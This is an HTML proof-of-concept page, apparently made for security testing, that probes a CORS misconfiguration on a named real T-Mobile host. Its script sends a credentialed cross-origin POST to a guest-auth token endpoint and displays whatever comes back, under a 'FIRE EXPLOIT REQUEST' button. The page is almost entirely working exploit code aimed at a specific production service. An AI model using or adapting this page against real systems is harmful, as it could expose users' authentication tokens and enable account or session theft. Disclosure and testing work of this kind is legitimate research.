<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>T-Mobile PoC Test</title>
    <style>
        body { font-family: sans-serif; padding: 50px; text-align: center; }
        #runBtn { 
            padding: 20px 40px; 
            font-size: 20px; 
            background-color: #e20074; /* T-Mobile Magenta */
            color: white; 
            border: none; 
            cursor: pointer; 
            border-radius: 8px;
        }
        #runBtn:hover { background-color: #b1005b; }
        #output { 
            margin-top: 20px; 
            text-align: left; 
            background: #222; 
            color: #0f0; 
            padding: 20px; 
            overflow: auto; 
            min-height: 100px;
        }
    </style>
</head>
<body>

    <h1>CORS Vulnerability Tester</h1>
    <p>Target: <code>adn.t-mobile.com</code></p>
    
    <button id="runBtn">FIRE EXPLOIT REQUEST</button>
    
    <pre id="output">Results will appear here...</pre>

    <script>
        document.getElementById('runBtn').addEventListener('click', async function() {
            const output = document.getElementById('output');
            output.innerText = "Attempting fetch...";

            try {
                const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
                const response = await fetch(target, {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'include',
                    headers: { 'Content-Type': 'text/plain' },
                    body: '{}'
                });

                const data = await response.text();
                output.innerText = "Status: " + response.status + "\n\nBody: " + data;
            } catch (err) {
                output.innerText = "Error: " + err;
            }
        });
    </script>

</body>
</html>
